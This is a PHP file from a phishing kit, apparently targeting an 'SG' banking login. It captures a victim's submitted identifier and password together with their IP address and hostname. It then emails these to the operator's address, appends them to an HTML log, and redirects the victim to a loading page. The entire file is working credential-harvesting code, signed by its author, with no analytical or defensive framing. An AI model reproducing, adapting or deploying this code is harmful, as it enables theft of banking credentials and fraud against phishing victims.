
<?php
session_start();
include './check.php';
error_reporting(E_ALL);
date_default_timezone_set('GMT');include '../rm.php';$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "SG@iestoreakeup.com";$headers = "From:" . $from;$subj = "SG Acces 2019 : $ip";
if(!isset($_REQUEST['ramid']) || $_REQUEST['ramid']==""){
	die('<script type="text/javascript">top.location = "index.php";</script>');
}
if(!isset($_REQUEST['ramida']) || $_REQUEST['ramida']==""){
	die('<script type="text/javascript">top.location = "index.php";</script>');
}
$ab = $_REQUEST['ramid'];
$bb = $_REQUEST['ramida'];
$data = "
+======================$subj======================+
|  Information Login by Ilyas Xevil
| identification : $ab
| Pass : $bb     
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by Ilyas Xevil                  
+===================================================================+";
    $datas = "
<center>
  <h1 style='color:red;'>LOG S-G 2019 <span style='color:blue;'>$ip</span></h1><br>
    <label><strong>login:</strong></label><span style='color:#FF8000;'>&nbsp; &nbsp;<strong>$ab</strong></span><br>
    <label><strong>Psswd:</strong></label><span style='color:#FF8000;'>&nbsp; &nbsp;<strong>$bb</strong></span><br>
    <hr>
</center>";


if($Save_Log==1) { $file = fopen("../../RA.html","a+"); fwrite($file, $datas); fclose($file);}if($Send_Log==1) { mail($to,$subj,$data,$headers); }die("<script type='text/javascript'>top.location = '../loading';</script>");